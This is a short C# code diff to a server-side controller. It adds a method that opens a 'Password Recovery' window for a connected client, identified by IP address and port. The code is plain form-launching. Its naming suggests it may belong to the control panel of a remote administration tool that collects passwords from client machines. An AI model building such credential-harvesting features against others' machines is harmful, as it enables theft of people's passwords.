@@ -133,7 +133,21 @@ namespace Serveur.Controllers
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, "FrmSi MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(ex.Message, "FrmStm MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        public void frmPr(ClientMosaic client)
+        {
+            try
+            {
+                FrmPasswordRecovery frmPr = new FrmPasswordRecovery(client);
+                frmPr.Text = "Password Recovery" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
+                frmPr.ShowDialog();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "FrmPr MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
     }
